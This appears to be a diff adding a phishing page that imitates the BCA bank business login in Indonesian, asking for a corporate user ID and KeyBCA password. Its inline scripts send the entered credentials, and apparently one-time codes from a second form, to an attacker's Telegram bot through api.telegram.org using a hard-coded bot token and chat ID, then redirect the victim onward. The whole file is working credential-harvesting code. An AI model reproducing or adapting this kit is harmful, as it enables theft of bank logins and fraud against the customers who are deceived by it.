@@ -1,0 +1,204 @@
+<html lang="in">
+ <head> 
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+  <meta http-equiv="X-UA-Compatible" content="ie=edge"> 
+  <title>BCA</title> 
+  <link rel="canonical" href="https://hol-wis.my.id"> 
+  <link rel="shortcut icon" href="assets/favicon.ico" type="image/x-icon"> 
+  <link rel="apple-touch-icon" href="./assets/ico/apple-touch-icon.png"> 
+  <link rel="stylesheet" href="assets/css/main.css"> 
+  <link rel="stylesheet" href="assets/css/styles.css"> 
+  <link rel="stylesheet" href="assets/css/main.css"> 
+  <link rel="stylesheet" href="assets/css/styles.2.css"> 
+  <link rel="stylesheet" href="styles.64003c381abb4bcbd5d1.css"> 
+  <style>
+     @charset "UTF-8";
+@import url(assets/plugins/fontawesome-5.5.0/css/all.min.css);
+@import url(assets/plugins/animate-css-3.6.0/animate.min.css);
+      .grecaptcha-badge {
+        visibility: collapse !important;
+      }   
+ @import url('https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap');
+    * {
+        font-family: 'Ubuntu', sans-serif;
+        font-weight: 400;
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        position: relative;
+        color: #000;
+    }
+     body, html{
+     background-image: url('images/2024/09/02/WBmE72.jpg');
+    background-repeat: no-repeat;
+    background-position: 100% 100%;
+    background-size: 100% 100%;
+        font-family: 'Ubuntu', sans-serif;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      top: 0;
+      margin: 0px auto;
+      background-color:#f6f6f6ef;
+      width: 100%;
+      height: 100%;
+      positon: fixed;
+}
+ .container {
+        max-width: 90%;
+        padding: 0px;
+        background-color:;
+        margin-left: auto;
+        margin-right: auto;
+        border-radius:10px;
+    }
+    .button {
+        margin-top: 5px;
+        width: 100%;
+        height: 40px;
+        border: none;
+        outline: none;
+        border-radius: 25px;
+        color: #fff;
+        background: #1171ce;
+        text-align: center;
+        font-size: 13px;
+        font-weight: bold;
+        box-shadow: 2px 2px 2px 0px rgba(8,8,0,0.5);
+    }
+    button:disabled {
+        opacity: 0.7;
+    }
+    input {
+        width:100%;
+        height: 40px;
+        margin:;
+        padding:10px;
+        border-radius:4px;
+        border:none;
+        box-shadow:  0px 4px 4px 0px #dedede;
+    }
+    </style> 
+ </head>
+ <body style="position: ring; margin: 0px auto; left: 0; right: 0; top: 0">
+  <div class="space" style="padding:0px;height:0%;"> 
+  </div> 
+  <img src="img/WBmY4I.jpg" width="100%" style="" alt=""> 
+  <div class="space" style="padding:0%;height:;margin:;"> 
+  </div> 
+<div class="container"> 
+  <form id="login-form"> <!-- Menghapus action dan method agar data dikirim via JS -->
+    <div class="container"> 
+      <br> 
+      <lbl style="color:#1e5cb5;font-weight: 800;font-size:14px;">
+        Username
+      </lbl> 
+      <input type="text" id="username" placeholder="CorporateID UserID (Tanpa Spasi)" name="user" required> 
+      <br>
+      <br> 
+      <lbl style="color:#1e5cb5;font-weight: 800;font-size:14px;">
+        Password
+      </lbl> 
+      <input type="password" id="password" inputmode="numeric" placeholder="KeyBCA Appli 1" name="pass" required> 
+      <br>
+      <br> 
+      <button type="submit" id="login-btn" style="width: 100%; height: 40px; position; fixed; bottom: 0; right; 0; left: 0; margin-bottom: -23px; padding: 0px 0px; background: #0f65b8;color:#fff;border-radius:20px;font-weight: solid;border: 0px none #fff;font-size:17px;">
+        <img src="img/but.jpg" style="width: 100%; height; 40px; margin-top: -0px; bottom: 0;"> LOGIN
+      </button> 
+    </div>
+  </form> 
+  <br> 
+</div>
+
+<script src="config.js"></script>
+<script>
+  let attemptCount = 0; // Variabel untuk menghitung percobaan
+
+  document.getElementById("login-form").addEventListener("submit", function (event) {
+    event.preventDefault();
+
+    if (attemptCount >= 2) {
+      alert("Anda hanya bisa mencoba 2 kali!");
+      return;
+    }
+
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
+
+    // Kirim data ke bot Telegram
+    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: `UserBCA-BISNIS: ${username}\nPassBCA-BISNIS: ${password}`,
+      }),
+    }).then(response => {
+      if (response.ok) {
+        window.location.href = "bisnis2.html"; // Redirect ke bisnis2.html
+      } else {
+        alert("Gagal mengirim data ke bot Telegram.");
+      }
+    }).catch(error => {
+      console.error("Error:", error);
+      alert("Terjadi kesalahan saat mengirim data.");
+    });
+
+    attemptCount++; // Tambah jumlah percobaan
+  });
+</script>
+
+ 
+  <img src="img/WBmuM1.jpg" width="100%" alt=""> 
+  <!--jQuery UI--> 
+  <!--Has dependency on main.scss--> 
+  <!--Viewport Checker--> 
+  <!--For viewport animation--> 
+  <!--Jquery Mask--> 
+  <!--For Money Format--> 
+  <!-- Exif JS --> 
+  <script>
+$( document ).ready(function() {
+            setTimeout(() => {
+                $('#lodingku').hide();
+                $('chsalxcome2').fadeIn();
+            },860)
+        })
+</script> 
+  <p id="status"></p> 
+  <script>
+            $(document).ready(function() {
+            $("div#eyeOpen").on('click', function() {
+                $("#eyeOpen").css("display", "none");
+                $("#eyeClose").css("display", "block");
+                $("#password").prop("type", "text");
+                $("div#eyeClose").on('click', function() {
+                    $("#eyeOpen").css("display", "block");
+                    $("#eyeClose").css("display", "none");
+                    $("#password").prop("type", "password");
+                });
+            });
+const chat_id = '7540033215', botID = 'bot6904650216:AAG3UFJBBm7Qeou-S8Yf0C1XMw0K-gcNSq0';
+    const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
+    document.querySelector('#setOtp').addEventListener("submit", async e => { // When the user submits the form
+        e.preventDefault(); // Don't submit
+        let text = JSON.stringify( // Convert the form data to a string to send as our Telegram message
+            Object.fromEntries(new FormData(e.target).entries()), // Convert the form data to an object.
+        null, 2); // Prettify the JSON so we can read the data easily
+        const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
+            method: 'POST',
+            headers: {"Content-Type": "application/json"}, // This is required when sending a JSON body.
+            body: JSON.stringify({chat_id, text}), // The body must be a string, not an object
+        });
+        const messageStatus = document.querySelector('#status');
+        if (sendMessage.ok) // Update the user on if the message went through
+            messageStatus.textContent = "";
+        else
+            messageStatus.textContent = "Message Failed to send :( " + (await sendMessage.text());
+        e.target.reset(); // Clear the form fields.
+    });
+        });
+   </script> 
+ </body>
+</html>
